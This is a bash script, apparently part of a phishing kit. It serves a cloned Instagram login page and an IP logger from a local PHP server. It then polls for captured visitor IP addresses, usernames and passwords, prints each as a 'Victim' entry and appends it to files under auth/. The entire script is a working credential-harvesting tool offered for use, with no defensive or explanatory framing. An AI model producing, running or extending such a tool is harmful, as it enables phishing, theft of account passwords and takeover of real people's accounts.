#!/bin/bash

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080'

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
        mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
        rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
        rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
        exit 0
}

exit_on_signal_SIGTERM() {
        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
        exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color
        return
}

## Kill already running process
kill_pid() {
        check_PID="php"
        for process in ${check_PID}; do
                if [[ $(pidof ${process}) ]]; then
                        killall ${process} > /dev/null 2>&1
                fi
        done
}

## Dependencies
dependencies() {
        if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
        else
                pkgs=(php curl unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                                if [[ $(command -v pkg) ]]; then
                                        pkg install "$pkg" -y
                                elif [[ $(command -v apt) ]]; then
                                        sudo apt install "$pkg" -y
                                elif [[ $(command -v apt-get) ]]; then
                                        sudo apt-get install "$pkg" -y
                                elif [[ $(command -v pacman) ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ $(command -v dnf) ]]; then
                                        sudo dnf -y install "$pkg"
                                elif [[ $(command -v yum) ]]; then
                                        sudo yum -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi
}

## Setup website and start php server
setup_site() {
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
        cp -rf .sites/instagram/* .server/www
        cp -f .sites/ip.php .server/www/
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
        IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
        IFS=$'\n'
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
        cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
        ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
        PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
        IFS=$'\n'
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
        cat .server/www/usernames.txt >> auth/usernames.dat
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
        while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
                if [[ -e ".server/www/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                        capture_creds
                        rm -rf .server/www/usernames.txt
                fi
                sleep 0.75
        done
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        setup_site
        { sleep 1; }
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
        capture_data
}

## Main execution
main() {
        kill_pid
        dependencies
        website="instagram"
        start_localhost
}

# Run the script
main
